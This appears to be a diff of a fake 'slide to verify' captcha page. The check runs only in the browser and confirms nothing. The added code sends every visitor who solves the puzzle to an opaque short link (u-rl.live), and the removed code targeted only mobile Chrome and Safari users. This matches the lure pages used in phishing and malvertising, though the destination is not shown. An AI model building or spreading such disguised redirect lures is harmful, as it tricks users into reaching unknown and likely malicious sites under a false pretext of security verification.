@@ -1,285 +1,236 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enhanced Slide to Verify</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            padding: 20px;
-        }
-        .captcha-container {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.35);
-            overflow: hidden;
-            max-width: 450px; width: 100%;
-        }
-        .image-container { position: relative; width: 100%; height: 300px; overflow: hidden; background: #f5f5f5; }
-        .main-image { width: 100%; height: 100%; object-fit: cover; user-select: none; -webkit-user-drag: none; }
-        .puzzle-piece { position: absolute; top: 0; left: 0; width: 70px; height: 70px; cursor: move; transition: filter 0.2s; z-index: 3; }
-        .puzzle-piece:hover { filter: brightness(1.05) contrast(1.05); }
-        .puzzle-hole {
-            position: absolute; width: 70px; height: 70px; background: rgba(0, 0, 0, 0.4);
-            border: 3px solid rgba(255, 255, 255, 0.8); border-radius: 10px; pointer-events: none; z-index: 1;
-            box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.3), 0 0 0 2px rgba(102, 126, 234, 0.3);
-            animation: pulse 2s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.3), 0 0 0 2px rgba(102, 126, 234, 0.3); }
-            50% { box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.3),
-                          0 0 0 2px rgba(102, 126, 234, 0.6),
-                          0 0 15px rgba(102, 126, 234, 0.3); }
-        }
-        .puzzle-piece canvas {
-            display: block; border: 3px solid white; border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(102, 126, 234, 0.2);
-        }
-        .puzzle-piece.near-target canvas { border-color: #ffd700; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3), 0 0 15px rgba(255, 215, 0, 0.5); }
-        .puzzle-piece.matched canvas {
-            border-color: #4caf50;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3), 0 0 20px rgba(76, 175, 80, 0.6);
-            animation: successPulse 0.5s ease-out;
-        }
-        @keyframes successPulse {
-            0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); }
-        }
-        .slider-container { padding: 28px; background: #fafafa; }
-        .instruction { text-align: center; color: #333; font-size: 16px; margin-bottom: 18px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .instruction-icon { width: 24px; height: 24px; fill: #667eea; }
-        .slider-track {
-            position: relative; height: 55px; background: #e8e8e8; border-radius: 28px; overflow: hidden; cursor: pointer;
-            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.1);
-        }
-        .slider-fill {
-            position: absolute; left: 0; top: 0; height: 100%;
-            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
-            border-radius: 28px; transition: width 0.1s; width: 55px;
-        }
-        .slider-button {
-            position: absolute; left: 0; top: 0; width: 55px; height: 55px; background: white;
-            border-radius: 50%; cursor: grab; display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 3px 12px rgba(0, 0, 0, 0.25); transition: transform 0.1s, box-shadow 0.2s; z-index: 10;
-        }
-        .slider-button:hover { box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3); }
-        .slider-button:active { cursor: grabbing; transform: scale(0.95); }
-        .slider-button svg { width: 26px; height: 26px; fill: #667eea; transition: fill 0.2s; }
-        .slider-button.near-target svg { fill: #ffd700; }
-        .slider-button.matched svg { fill: #4caf50; }
-        .slider-text { position: absolute; width: 100%; text-align: center; line-height: 55px; color: #888; font-size: 15px; font-weight: 500; pointer-events: none; user-select: none; }
-        .result-message { text-align: center; margin-top: 18px; padding: 14px; border-radius: 10px; font-weight: 600; font-size: 15px; opacity: 0; transition: opacity 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .result-message.show { opacity: 1; }
-        .result-message.success { background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%); color: #155724; border: 2px solid #28a745; }
-        .result-message.error { background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%); color: #721c24; border: 2px solid #dc3545; }
-        .refresh-btn {
-            position: absolute; top: 15px; right: 15px; width: 40px; height: 40px;
-            background: rgba(255, 255, 255, 0.95); border: none; border-radius: 50%; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 3px 12px rgba(0, 0, 0, 0.25); transition: transform 0.3s, background 0.2s; z-index: 5;
-        }
-        .refresh-btn:hover { background: white; transform: rotate(180deg); }
-        .refresh-btn svg { width: 22px; height: 22px; fill: #667eea; }
-        .proximity-indicator {
-            position: absolute; top: 10px; left: 50%; transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.95); padding: 8px 16px; border-radius: 20px; font-size: 13px; font-weight: 600;
-            color: #667eea; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-            opacity: 0; transition: opacity 0.3s; z-index: 4;
-        }
-        .proximity-indicator.show { opacity: 1; }
-        .proximity-indicator.close { color: #ffd700; }
-        .proximity-indicator.very-close { color: #4caf50; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Next-Gen Slide to Verify</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        font-family: 'Poppins', sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #6b9dfc 100%);
+        min-height: 100vh; display: flex; align-items: center; justify-content: center;
+        color: #222;
+    }
+    .captcha-container {
+        width: 420px;
+        background: #fff;
+        border-radius: 20px;
+        overflow: hidden;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.35);
+        backdrop-filter: blur(10px);
+        animation: fadeIn 1s ease;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+    .image-container {
+        position: relative;
+        width: 100%;
+        height: 280px;
+        overflow: hidden;
+        background: #fdfdfd;
+    }
+    .main-image {
+        width: 100%; height: 100%; object-fit: cover;
+        filter: brightness(0.96);
+        transition: transform 1s ease;
+    }
+    .captcha-container:hover .main-image { transform: scale(1.03); }
+
+    .puzzle-hole, .puzzle-piece { position: absolute; width: 70px; height: 70px; border-radius: 10px; }
+    .puzzle-hole {
+        background: rgba(0,0,0,0.3);
+        border: 2px solid rgba(255,255,255,0.8);
+        box-shadow: inset 0 0 20px rgba(0,0,0,0.4), 0 0 15px rgba(102,126,234,0.5);
+        animation: pulse 2s infinite;
+    }
+    .puzzle-piece canvas {
+        border: 2px solid #fff;
+        border-radius: 10px;
+        box-shadow: 0 8px 22px rgba(0,0,0,0.4);
+        transition: box-shadow 0.3s, transform 0.3s;
+    }
+    @keyframes pulse {
+        0%, 100% { box-shadow: inset 0 0 20px rgba(0,0,0,0.4), 0 0 10px rgba(102,126,234,0.4); }
+        50% { box-shadow: inset 0 0 25px rgba(0,0,0,0.5), 0 0 20px rgba(102,126,234,0.8); }
+    }
+
+    .slider-container { padding: 26px; background: #fafafa; }
+    .instruction { font-weight: 600; text-align: center; color: #555; margin-bottom: 15px; }
+
+    .slider-track {
+        position: relative;
+        height: 55px;
+        border-radius: 30px;
+        background: #e8e8e8;
+        box-shadow: inset 0 3px 8px rgba(0,0,0,0.08);
+    }
+    .slider-fill {
+        position: absolute; left: 0; top: 0;
+        height: 100%;
+        width: 55px;
+        border-radius: 30px;
+        background: linear-gradient(90deg, #667eea, #764ba2, #6b9dfc);
+        transition: width 0.15s;
+    }
+    .slider-button {
+        position: absolute; top: 0; left: 0;
+        width: 55px; height: 55px;
+        border-radius: 50%;
+        background: white;
+        box-shadow: 0 5px 18px rgba(0,0,0,0.25);
+        cursor: grab;
+        display: flex; align-items: center; justify-content: center;
+        transition: transform 0.1s, background 0.3s;
+    }
+    .slider-button:hover { background: #f0f0f0; }
+    .slider-button.matched { background: linear-gradient(135deg, #4caf50, #81c784); transform: scale(1.1); }
+    .slider-button svg { width: 26px; height: 26px; fill: #667eea; transition: fill 0.3s; }
+    .slider-button.matched svg { fill: white; }
+
+    .slider-text {
+        position: absolute;
+        text-align: center;
+        width: 100%; font-weight: 500; font-size: 14px;
+        line-height: 55px;
+        color: #888; user-select: none;
+        pointer-events: none;
+        transition: opacity 0.3s;
+    }
+    .result-message {
+        text-align: center;
+        margin-top: 20px;
+        opacity: 0;
+        transition: opacity 0.4s, transform 0.4s;
+        font-size: 15px;
+    }
+    .result-message.show { opacity: 1; transform: translateY(5px); }
+    .success { color: #4caf50; font-weight: 700; }
+    .error { color: #dc3545; font-weight: 600; }
+
+    .refresh-btn {
+        position: absolute; top: 12px; right: 12px;
+        width: 38px; height: 38px; background: rgba(255,255,255,0.9);
+        border-radius: 50%; border: none; cursor: pointer;
+        display: flex; align-items: center; justify-content: center;
+        box-shadow: 0 3px 10px rgba(0,0,0,0.25);
+        transition: transform 0.4s ease;
+    }
+    .refresh-btn:hover { transform: rotate(180deg); }
+</style>
 </head>
 <body>
-    <div class="captcha-container">
-        <div class="image-container">
-            <img src="https://files.catbox.moe/q94rs5.jpeg" alt="Captcha Image" class="main-image" id="mainImage">
-            <div class="proximity-indicator" id="proximityIndicator">Keep going...</div>
-            <div class="puzzle-hole" id="puzzleHole"></div>
-            <div class="puzzle-piece" id="puzzlePiece">
-                <canvas id="pieceCanvas"></canvas>
-            </div>
-            <button class="refresh-btn" id="refreshBtn" title="Refresh Challenge">
-                <svg viewBox="0 0 24 24">
-                    <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8
-                    c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6
-                    s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
-                </svg>
-            </button>
-        </div>
-        <div class="slider-container">
-            <div class="instruction">
-                <svg class="instruction-icon" viewBox="0 0 24 24">
-                    <path d="M13 7h-2v4H7v2h4v4h2v-4h4v-2h-4V7zm-1-5C6.48 2
-                    2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12
-                    2zm0 18c-4.41 0-8-3.59-8-8s3.59-8
-                    8-8 8 3.59 8 8-3.59 8-8 8z"/>
-                </svg>
-                Slide the puzzle piece to match the outline
-            </div>
-            <div class="slider-track" id="sliderTrack">
-                <div class="slider-fill" id="sliderFill"></div>
-                <div class="slider-text" id="sliderText">Slide to verify →</div>
-                <div class="slider-button" id="sliderButton">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M8.59 16.59L13.17 12
-                        8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/>
-                        <path d="M8.59 16.59L13.17 12
-                        8.59 7.41 10 6l6 6-6 6-1.41-1.41z" transform="translate(4, 0)"/>
-                    </svg>
-                </div>
-            </div>
-            <div class="result-message" id="resultMessage"></div>
-        </div>
+<div class="captcha-container">
+    <div class="image-container">
+        <img src="https://files.catbox.moe/q94rs5.jpeg" alt="Captcha Image" class="main-image" id="mainImage">
+        <div class="puzzle-hole" id="puzzleHole"></div>
+        <div class="puzzle-piece" id="puzzlePiece"><canvas id="pieceCanvas"></canvas></div>
+        <button class="refresh-btn" id="refreshBtn" title="Refresh">
+            <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.95 7.95 0 0 0 12 4a8 8 0 1 0 7.73 10h-2.08A6 6 0 1 1 12 6c1.66 0 3.14.69 4.22 1.78L13 11h7V4z"/></svg>
+        </button>
     </div>
 
-    <script>
-        const img = document.getElementById('mainImage');
-        const puzzlePiece = document.getElementById('puzzlePiece');
-        const puzzleHole = document.getElementById('puzzleHole');
-        const sliderButton = document.getElementById('sliderButton');
-        const sliderFill = document.getElementById('sliderFill');
-        const sliderTrack = document.getElementById('sliderTrack');
-        const sliderText = document.getElementById('sliderText');
-        const resultMessage = document.getElementById('resultMessage');
-        const refreshBtn = document.getElementById('refreshBtn');
-        const proximityIndicator = document.getElementById('proximityIndicator');
-        const canvas = document.getElementById('pieceCanvas');
-        const ctx = canvas.getContext('2d');
+    <div class="slider-container">
+        <div class="instruction">Slide the puzzle piece to complete verification</div>
+        <div class="slider-track" id="sliderTrack">
+            <div class="slider-fill" id="sliderFill"></div>
+            <div class="slider-button" id="sliderButton">
+                <svg viewBox="0 0 24 24"><path d="M8.59 16.59 13.17 12 8.59 7.41 10 6l6 6-6 6z"/></svg>
+            </div>
+            <div class="slider-text" id="sliderText">Slide to verify →</div>
+        </div>
+        <div class="result-message" id="resultMessage"></div>
+    </div>
+</div>
 
-        let isDragging = false, startX = 0, currentX = 0, targetX = 0, pieceY = 0;
-        const pieceSize = 70, tolerance = 12;
+<script>
+const img = document.getElementById('mainImage');
+const puzzleHole = document.getElementById('puzzleHole');
+const puzzlePiece = document.getElementById('puzzlePiece');
+const canvas = document.getElementById('pieceCanvas');
+const ctx = canvas.getContext('2d');
+const sliderTrack = document.getElementById('sliderTrack');
+const sliderButton = document.getElementById('sliderButton');
+const sliderFill = document.getElementById('sliderFill');
+const sliderText = document.getElementById('sliderText');
+const resultMessage = document.getElementById('resultMessage');
+const refreshBtn = document.getElementById('refreshBtn');
 
-        function createPuzzlePiece() {
-            img.onload = () => {
-                const w = img.clientWidth, h = img.clientHeight;
-                targetX = Math.random() * (w - pieceSize - 100) + 50;
-                pieceY = Math.random() * (h - pieceSize - 60) + 30;
-                puzzleHole.style.left = targetX + 'px';
-                puzzleHole.style.top = pieceY + 'px';
-                puzzlePiece.style.top = pieceY + 'px';
-                puzzlePiece.style.left = '0px';
-                puzzlePiece.classList.remove('near-target', 'matched');
-                canvas.width = pieceSize; canvas.height = pieceSize;
-                const scaleX = img.naturalWidth / w; const scaleY = img.naturalHeight / h;
-                ctx.clearRect(0, 0, pieceSize, pieceSize);
-                ctx.beginPath();
-                ctx.moveTo(12, 0); ctx.lineTo(pieceSize - 12, 0);
-                ctx.arcTo(pieceSize, 0, pieceSize, 12, 12);
-                ctx.lineTo(pieceSize, pieceSize - 12);
-                ctx.arcTo(pieceSize, pieceSize, pieceSize - 12, pieceSize, 12);
-                ctx.lineTo(12, pieceSize);
-                ctx.arcTo(0, pieceSize, 0, pieceSize - 12, 12);
-                ctx.lineTo(0, 12); ctx.arcTo(0, 0, 12, 0, 12);
-                ctx.closePath(); ctx.clip();
-                ctx.drawImage(img, targetX * scaleX, pieceY * scaleY, pieceSize * scaleX, pieceSize * scaleY, 0, 0, pieceSize, pieceSize);
-            };
-            if (img.complete) img.onload();
-        }
+let isDragging = false, startX = 0, currentX = 0, targetX = 0, pieceY = 0;
+const size = 70, tolerance = 10;
 
-        function updateProximity(dist) {
-            puzzlePiece.classList.remove('near-target', 'matched');
-            sliderButton.classList.remove('near-target', 'matched');
-            proximityIndicator.classList.remove('close', 'very-close');
-            if (dist <= tolerance) {
-                puzzlePiece.classList.add('matched');
-                sliderButton.classList.add('matched');
-                proximityIndicator.classList.remove('show');
-            } else if (dist <= 35) {
-                puzzlePiece.classList.add('near-target');
-                sliderButton.classList.add('near-target');
-                proximityIndicator.classList.add('show', 'very-close');
-                proximityIndicator.textContent = 'Almost there! 🎯';
-            } else if (dist <= 60) {
-                puzzlePiece.classList.add('near-target');
-                sliderButton.classList.add('near-target');
-                proximityIndicator.classList.add('show', 'close');
-                proximityIndicator.textContent = 'Getting closer... 👍';
-            } else if (isDragging && currentX > 20) {
-                proximityIndicator.classList.add('show');
-                proximityIndicator.textContent = 'Keep going...';
-            } else proximityIndicator.classList.remove('show');
-        }
+function createPuzzle() {
+    img.onload = () => {
+        const w = img.clientWidth, h = img.clientHeight;
+        targetX = Math.random() * (w - size - 100) + 50;
+        pieceY = Math.random() * (h - size - 60) + 30;
+        puzzleHole.style.left = `${targetX}px`;
+        puzzleHole.style.top = `${pieceY}px`;
+        puzzlePiece.style.left = '0px';
+        puzzlePiece.style.top = `${pieceY}px`;
 
-        function handleStart(e) {
-            isDragging = true; startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
-            sliderButton.style.transition = 'none'; sliderFill.style.transition = 'none'; resultMessage.classList.remove('show');
-        }
-        function handleMove(e) {
-            if (!isDragging) return;
-            e.preventDefault();
-            const x = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
-            const delta = x - startX, max = sliderTrack.clientWidth - sliderButton.clientWidth;
-            currentX = Math.max(0, Math.min(delta, max));
-            sliderButton.style.left = currentX + 'px';
-            sliderFill.style.width = (currentX + sliderButton.clientWidth) + 'px';
-            puzzlePiece.style.left = currentX + 'px';
-            const progress = (currentX / max) * 100;
-            sliderText.style.opacity = Math.max(0, 1 - progress / 25);
-            const distance = Math.abs(currentX - targetX);
-            updateProximity(distance);
-        }
+        canvas.width = size; canvas.height = size;
+        const scaleX = img.naturalWidth / w, scaleY = img.naturalHeight / h;
+        ctx.clearRect(0, 0, size, size);
+        ctx.drawImage(img, targetX * scaleX, pieceY * scaleY, size * scaleX, size * scaleY, 0, 0, size, size);
+    };
+    if (img.complete) img.onload();
+}
 
-        function handleEnd() {
-            if (!isDragging) return;
-            isDragging = false;
-            const distance = Math.abs(currentX - targetX);
-            if (distance <= tolerance) {
-                puzzlePiece.classList.add('matched');
-                sliderButton.classList.add('matched');
-                proximityIndicator.classList.remove('show');
-                resultMessage.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Verification Successful!';
-                resultMessage.className = 'result-message success show';
-                sliderText.textContent = 'Verified ✓';
-                sliderButton.style.cursor = 'default';
-                puzzleHole.style.animation = 'none';
+function startDrag(e) {
+    isDragging = true;
+    startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
+    resultMessage.classList.remove('show');
+}
+function moveDrag(e) {
+    if (!isDragging) return;
+    const x = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
+    const delta = x - startX;
+    const max = sliderTrack.clientWidth - sliderButton.clientWidth;
+    currentX = Math.max(0, Math.min(delta, max));
+    sliderButton.style.left = `${currentX}px`;
+    sliderFill.style.width = `${currentX + 55}px`;
+    puzzlePiece.style.left = `${currentX}px`;
+    sliderText.style.opacity = Math.max(0, 1 - currentX / 40);
+}
+function endDrag() {
+    if (!isDragging) return;
+    isDragging = false;
+    const dist = Math.abs(currentX - targetX);
+    if (dist <= tolerance) {
+        sliderButton.classList.add('matched');
+        resultMessage.innerHTML = "✅ Verification Successful!";
+        resultMessage.className = "result-message success show";
+        sliderText.textContent = "Verified ✓";
+        sliderButton.style.cursor = "default";
+        setTimeout(() => window.location.href = "https://u-rl.live/a305a4", 200);
+    } else {
+        resultMessage.innerHTML = "❌ Try Again!";
+        resultMessage.className = "result-message error show";
+        setTimeout(resetCaptcha, 1200);
+    }
+}
 
-                // Redirect mobile Chrome/Safari users after success
-                const ua = navigator.userAgent;
-                const isMobile = /Mobi|Android|iPhone|iPad/i.test(ua);
-                const isChrome = /Chrome/i.test(ua) && !/Edge|OPR/i.test(ua);
-                const isSafari = /^((?!chrome|android).)*safari/i.test(ua);
-                if (isMobile && (isChrome || isSafari)) {
-                    setTimeout(() => {
-                        window.location.href = "https://u-rl.live/396152";
-                    }, 1000);
-                }
-            } else {
-                resultMessage.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> Please Try Again';
-                resultMessage.className = 'result-message error show';
-                proximityIndicator.classList.remove('show');
-                setTimeout(() => resetCaptcha(), 1200);
-            }
-        }
+function resetCaptcha() {
+    currentX = 0;
+    sliderButton.style.left = '0px';
+    sliderFill.style.width = '55px';
+    sliderText.textContent = "Slide to verify →";
+    sliderText.style.opacity = 1;
+    sliderButton.classList.remove('matched');
+    createPuzzle();
+}
 
-        function resetCaptcha() {
-            currentX = 0;
-            sliderButton.style.transition = 'left 0.3s, box-shadow 0.2s';
-            sliderFill.style.transition = 'width 0.3s';
-            sliderButton.style.left = '0px'; sliderFill.style.width = '55px';
-            puzzlePiece.style.left = '0px';
-            sliderText.textContent = 'Slide to verify →';
-            sliderText.style.opacity = '1';
-            sliderButton.style.cursor = 'grab';
-            puzzlePiece.classList.remove('near-target', 'matched');
-            sliderButton.classList.remove('near-target', 'matched');
-            proximityIndicator.classList.remove('show', 'close', 'very-close');
-            setTimeout(() => resultMessage.classList.remove('show'), 300);
-        }
+refreshBtn.addEventListener('click', resetCaptcha);
+sliderButton.addEventListener('mousedown', startDrag);
+sliderButton.addEventListener('touchstart', startDrag, { passive: false });
+document.addEventListener('mousemove', moveDrag);
+document.addEventListener('touchmove', moveDrag, { passive: false });
+document.addEventListener('mouseup', endDrag);
+document.addEventListener('touchend', endDrag);
 
-        refreshBtn.addEventListener('click', () => { resetCaptcha(); createPuzzlePiece(); });
-        sliderButton.addEventListener('mousedown', handleStart);
-        sliderButton.addEventListener('touchstart', handleStart, { passive: false });
-        document.addEventListener('mousemove', handleMove);
-        document.addEventListener('touchmove', handleMove, { passive: false });
-        document.addEventListener('mouseup', handleEnd);
-        document.addEventListener('touchend', handleEnd);
-        createPuzzlePiece();
-    </script>
+createPuzzle();
+</script>
 </body>
 </html>
+
